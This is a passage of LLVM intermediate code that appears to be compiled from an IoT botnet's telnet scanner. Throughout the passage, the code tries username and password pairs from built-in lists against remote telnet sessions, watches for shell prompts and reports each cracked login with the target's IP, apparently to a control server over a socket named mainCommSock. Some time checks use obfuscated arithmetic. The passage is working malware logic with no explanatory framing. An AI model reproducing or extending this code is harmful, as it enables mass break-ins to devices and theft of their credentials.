  %829 = load i32, i32* %2, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 8
  %833 = load i8*, i8** %832, align 8
  %834 = call i32 @matchPrompt(i8* %833)
  %835 = icmp ne i32 %834, 0
  br i1 %835, label %856, label %836

; <label>:836:                                    ; preds = %828
  %837 = load i32, i32* %2, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 8
  %841 = load i8*, i8** %840, align 8
  call void @llvm.memset.p0i8.i64(i8* %841, i8 0, i64 1024, i32 1, i1 false)
  %842 = load i32, i32* %2, align 4
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %843
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %844, i32 0, i32 0
  %846 = load i32, i32* %845, align 16
  %847 = call i32 @sclose(i32 %846)
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 2
  store i8 0, i8* %851, align 8
  %852 = load i32, i32* %2, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 3
  store i8 1, i8* %855, align 1
  br label %1329

; <label>:856:                                    ; preds = %828
  %857 = load i32, i32* %2, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 2
  store i8 7, i8* %860, align 8
  br label %861

; <label>:861:                                    ; preds = %856
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 8
  %866 = load i8*, i8** %865, align 8
  call void @llvm.memset.p0i8.i64(i8* %866, i8 0, i64 1024, i32 1, i1 false)
  br label %1329

; <label>:867:                                    ; preds = %773
  %868 = load i32, i32* %2, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 8
  %872 = load i8*, i8** %871, align 8
  %873 = call i64 @strlen(i8* %872) #10
  %874 = trunc i64 %873 to i16
  %875 = load i32, i32* %2, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %876
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %877, i32 0, i32 7
  store i16 %874, i16* %878, align 16
  br label %879

; <label>:879:                                    ; preds = %867
  %880 = load i32, i32* %2, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 6
  %884 = load i32, i32* %883, align 4
  %885 = sub i32 0, %884
  %886 = sub i32 0, 30
  %887 = add i32 %885, %886
  %888 = sub i32 0, %887
  %889 = add i32 %884, 30
  %890 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %891 = icmp ult i32 %888, %890
  br i1 %891, label %892, label %907

; <label>:892:                                    ; preds = %879
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 0
  %897 = load i32, i32* %896, align 16
  %898 = call i32 @sclose(i32 %897)
  %899 = load i32, i32* %2, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %900
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %901, i32 0, i32 2
  store i8 0, i8* %902, align 8
  %903 = load i32, i32* %2, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 3
  store i8 1, i8* %906, align 1
  br label %907

; <label>:907:                                    ; preds = %892, %879
  br label %1328

; <label>:908:                                    ; preds = %67
  %909 = load i32, i32* %2, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 0
  %913 = load i32, i32* %912, align 16
  %914 = call i64 @send(i32 %913, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %915 = icmp slt i64 %914, 0
  br i1 %915, label %916, label %931

; <label>:916:                                    ; preds = %908
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 0
  %921 = load i32, i32* %920, align 16
  %922 = call i32 @sclose(i32 %921)
  %923 = load i32, i32* %2, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %924
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %925, i32 0, i32 2
  store i8 0, i8* %926, align 8
  %927 = load i32, i32* %2, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 3
  store i8 1, i8* %930, align 1
  br label %1329

; <label>:931:                                    ; preds = %908
  %932 = load i32, i32* %2, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 2
  store i8 8, i8* %935, align 8
  br label %1328

; <label>:936:                                    ; preds = %67
  %937 = load i32, i32* %2, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 0
  %941 = load i32, i32* %940, align 16
  %942 = call i64 @send(i32 %941, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 85, i32 16384)
  %943 = icmp slt i64 %942, 0
  br i1 %943, label %944, label %959

; <label>:944:                                    ; preds = %936
  %945 = load i32, i32* %2, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %946
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %947, i32 0, i32 0
  %949 = load i32, i32* %948, align 16
  %950 = call i32 @sclose(i32 %949)
  %951 = load i32, i32* %2, align 4
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %952
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %953, i32 0, i32 2
  store i8 0, i8* %954, align 8
  %955 = load i32, i32* %2, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %956
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %957, i32 0, i32 3
  store i8 1, i8* %958, align 1
  br label %1329

; <label>:959:                                    ; preds = %936
  %960 = load i32, i32* %2, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 2
  store i8 9, i8* %963, align 8
  br label %1328

; <label>:964:                                    ; preds = %67
  %965 = load i32, i32* %2, align 4
  %966 = sext i32 %965 to i64
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %966
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %967, i32 0, i32 0
  %969 = load i32, i32* %968, align 16
  %970 = call i64 @send(i32 %969, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %971 = icmp slt i64 %970, 0
  br i1 %971, label %972, label %987

; <label>:972:                                    ; preds = %964
  %973 = load i32, i32* %2, align 4
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %974
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %975, i32 0, i32 0
  %977 = load i32, i32* %976, align 16
  %978 = call i32 @sclose(i32 %977)
  %979 = load i32, i32* %2, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 2
  store i8 0, i8* %982, align 8
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 3
  store i8 1, i8* %986, align 1
  br label %1329

; <label>:987:                                    ; preds = %964
  %988 = load i32, i32* %2, align 4
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %989
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %990, i32 0, i32 2
  store i8 10, i8* %991, align 8
  br label %1328

; <label>:992:                                    ; preds = %67
  %993 = load i32, i32* %2, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %994
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %995, i32 0, i32 6
  %997 = load i32, i32* %996, align 4
  %998 = icmp eq i32 %997, 0
  br i1 %998, label %999, label %1005

; <label>:999:                                    ; preds = %992
  %1000 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1001 = load i32, i32* %2, align 4
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1002
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1003, i32 0, i32 6
  store i32 %1000, i32* %1004, align 4
  br label %1005

; <label>:1005:                                   ; preds = %999, %992
  %1006 = load i32, i32* %2, align 4
  %1007 = sext i32 %1006 to i64
  %1008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1007
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1008, i32 0, i32 0
  %1010 = load i32, i32* %1009, align 16
  %1011 = load i32, i32* %2, align 4
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 8
  %1015 = load i8*, i8** %1014, align 8
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 7
  %1020 = load i16, i16* %1019, align 16
  %1021 = zext i16 %1020 to i32
  %1022 = call i32 @readUntil(i32 %1010, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1015, i32 1024, i32 %1021)
  %1023 = icmp ne i32 %1022, 0
  br i1 %1023, label %1024, label %1087

; <label>:1024:                                   ; preds = %1005
  %1025 = load i32, i32* %2, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1026
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1027, i32 0, i32 6
  store i32 0, i32* %1028, align 4
  %1029 = load i32, i32* %2, align 4
  %1030 = sext i32 %1029 to i64
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1030
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1031, i32 0, i32 7
  store i16 0, i16* %1032, align 16
  %1033 = load i32, i32* %2, align 4
  %1034 = sext i32 %1033 to i64
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1034
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1035, i32 0, i32 8
  %1037 = load i8*, i8** %1036, align 8
  %1038 = call i8* @strstr(i8* %1037, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0)) #10
  %1039 = icmp ne i8* %1038, null
  br i1 %1039, label %1040, label %1067

; <label>:1040:                                   ; preds = %1024
  %1041 = load i32, i32* @mainCommSock, align 4
  %1042 = load i32, i32* %2, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 1
  %1046 = bitcast i32* %1045 to %struct.in_addr*
  %1047 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1046, i32 0, i32 0
  %1048 = load i32, i32* %1047, align 4
  %1049 = call i8* @inet_ntoa(i32 %1048) #4
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 4
  %1054 = load i8, i8* %1053, align 2
  %1055 = zext i8 %1054 to i64
  %1056 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1055
  %1057 = load i8*, i8** %1056, align 8
  %1058 = load i32, i32* %2, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1059
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1060, i32 0, i32 5
  %1062 = load i8, i8* %1061, align 1
  %1063 = zext i8 %1062 to i64
  %1064 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1063
  %1065 = load i8*, i8** %1064, align 8
  %1066 = call i32 (i32, i8*, ...) @sockprintf(i32 %1041, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.35, i32 0, i32 0), i8* %1049, i8* %1057, i8* %1065)
  br label %1067

; <label>:1067:                                   ; preds = %1040, %1024
  %1068 = load i32, i32* %2, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1069
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1070, i32 0, i32 8
  %1072 = load i8*, i8** %1071, align 8
  call void @llvm.memset.p0i8.i64(i8* %1072, i8 0, i64 1024, i32 1, i1 false)
  %1073 = load i32, i32* %2, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 0
  %1077 = load i32, i32* %1076, align 16
  %1078 = call i32 @sclose(i32 %1077)
  %1079 = load i32, i32* %2, align 4
  %1080 = sext i32 %1079 to i64
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1080
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1081, i32 0, i32 3
  store i8 1, i8* %1082, align 1
  %1083 = load i32, i32* %2, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 2
  store i8 0, i8* %1086, align 8
  br label %1329

; <label>:1087:                                   ; preds = %1005
  %1088 = load i32, i32* %2, align 4
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 8
  %1092 = load i8*, i8** %1091, align 8
  %1093 = call i64 @strlen(i8* %1092) #10
  %1094 = trunc i64 %1093 to i16
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 7
  store i16 %1094, i16* %1098, align 16
  br label %1099

; <label>:1099:                                   ; preds = %1087
  %1100 = load i32, i32* %2, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1102, i32 0, i32 6
  %1104 = load i32, i32* %1103, align 4
  %1105 = add i32 %1104, -843997947
  %1106 = add i32 %1105, 30
  %1107 = sub i32 %1106, -843997947
  %1108 = add i32 %1104, 30
  %1109 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1110 = icmp ult i32 %1107, %1109
  br i1 %1110, label %1111, label %1126

; <label>:1111:                                   ; preds = %1099
  %1112 = load i32, i32* %2, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1113
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1114, i32 0, i32 0
  %1116 = load i32, i32* %1115, align 16
  %1117 = call i32 @sclose(i32 %1116)
  %1118 = load i32, i32* %2, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1119
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1120, i32 0, i32 2
  store i8 0, i8* %1121, align 8
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 3
  store i8 1, i8* %1125, align 1
  br label %1126

; <label>:1126:                                   ; preds = %1111, %1099
  br label %1328

; <label>:1127:                                   ; preds = %67
  %1128 = load i32, i32* %2, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1130, i32 0, i32 0
  %1132 = load i32, i32* %1131, align 16
  %1133 = call i64 @send(i32 %1132, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %1134 = icmp slt i64 %1133, 0
  br i1 %1134, label %1135, label %1150

; <label>:1135:                                   ; preds = %1127
  %1136 = load i32, i32* %2, align 4
  %1137 = sext i32 %1136 to i64
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1137
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1138, i32 0, i32 0
  %1140 = load i32, i32* %1139, align 16
  %1141 = call i32 @sclose(i32 %1140)
  %1142 = load i32, i32* %2, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 2
  store i8 0, i8* %1145, align 8
  %1146 = load i32, i32* %2, align 4
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1147
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1148, i32 0, i32 3
  store i8 1, i8* %1149, align 1
  br label %1329

; <label>:1150:                                   ; preds = %1127
  %1151 = load i32, i32* %2, align 4
  %1152 = sext i32 %1151 to i64
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1152
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1153, i32 0, i32 2
  store i8 101, i8* %1154, align 8
  br label %1328

; <label>:1155:                                   ; preds = %67
  %1156 = load i32, i32* %2, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 16
  %1161 = call i64 @send(i32 %1160, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 282, i32 16384)
  %1162 = icmp slt i64 %1161, 0
  br i1 %1162, label %1163, label %1178

; <label>:1163:                                   ; preds = %1155
  %1164 = load i32, i32* %2, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 0
  %1168 = load i32, i32* %1167, align 16
  %1169 = call i32 @sclose(i32 %1168)
  %1170 = load i32, i32* %2, align 4
  %1171 = sext i32 %1170 to i64
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1171
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1172, i32 0, i32 2
  store i8 0, i8* %1173, align 8
  %1174 = load i32, i32* %2, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 3
  store i8 1, i8* %1177, align 1
  br label %1329

; <label>:1178:                                   ; preds = %1155
  %1179 = load i32, i32* %2, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 2
  store i8 102, i8* %1182, align 8
  br label %1328

; <label>:1183:                                   ; preds = %67
  %1184 = load i32, i32* %2, align 4
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1185
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1186, i32 0, i32 0
  %1188 = load i32, i32* %1187, align 16
  %1189 = call i64 @send(i32 %1188, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %1190 = icmp slt i64 %1189, 0
  br i1 %1190, label %1191, label %1206

; <label>:1191:                                   ; preds = %1183
  %1192 = load i32, i32* %2, align 4
  %1193 = sext i32 %1192 to i64
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1193
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1194, i32 0, i32 0
  %1196 = load i32, i32* %1195, align 16
  %1197 = call i32 @sclose(i32 %1196)
  %1198 = load i32, i32* %2, align 4
  %1199 = sext i32 %1198 to i64
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1199
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1200, i32 0, i32 2
  store i8 0, i8* %1201, align 8
  %1202 = load i32, i32* %2, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 3
  store i8 1, i8* %1205, align 1
  br label %1329

; <label>:1206:                                   ; preds = %1183
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 2
  store i8 103, i8* %1210, align 8
  br label %1328

; <label>:1211:                                   ; preds = %67
  %1212 = load i32, i32* %2, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1213
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1214, i32 0, i32 6
  %1216 = load i32, i32* %1215, align 4
  %1217 = icmp eq i32 %1216, 0
  br i1 %1217, label %1218, label %1224

; <label>:1218:                                   ; preds = %1211
  %1219 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 6
  store i32 %1219, i32* %1223, align 4
  br label %1224

; <label>:1224:                                   ; preds = %1218, %1211
  %1225 = load i32, i32* %2, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1226
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1227, i32 0, i32 0
  %1229 = load i32, i32* %1228, align 16
  %1230 = load i32, i32* %2, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 8
  %1234 = load i8*, i8** %1233, align 8
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 7
  %1239 = load i16, i16* %1238, align 16
  %1240 = zext i16 %1239 to i32
  %1241 = call i32 @readUntil(i32 %1229, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1234, i32 1024, i32 %1240)
  %1242 = icmp ne i32 %1241, 0
  br i1 %1242, label %1243, label %1289

; <label>:1243:                                   ; preds = %1224
  %1244 = load i32, i32* %2, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 6
  store i32 0, i32* %1247, align 4
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 7
  store i16 0, i16* %1251, align 16
  %1252 = load i32, i32* @mainCommSock, align 4
  %1253 = load i32, i32* %2, align 4
  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 1
  %1257 = bitcast i32* %1256 to %struct.in_addr*
  %1258 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1257, i32 0, i32 0
  %1259 = load i32, i32* %1258, align 4
  %1260 = call i8* @inet_ntoa(i32 %1259) #4
  %1261 = load i32, i32* %2, align 4
  %1262 = sext i32 %1261 to i64
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1262
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1263, i32 0, i32 4
  %1265 = load i8, i8* %1264, align 2
  %1266 = zext i8 %1265 to i64
  %1267 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1266
  %1268 = load i8*, i8** %1267, align 8
  %1269 = call i32 (i32, i8*, ...) @sockprintf(i32 %1252, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* %1260, i8* %1268)
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 0
  %1274 = load i32, i32* %1273, align 16
  %1275 = call i32 @sclose(i32 %1274)
  %1276 = load i32, i32* %2, align 4
  %1277 = sext i32 %1276 to i64
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1277
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1278, i32 0, i32 2
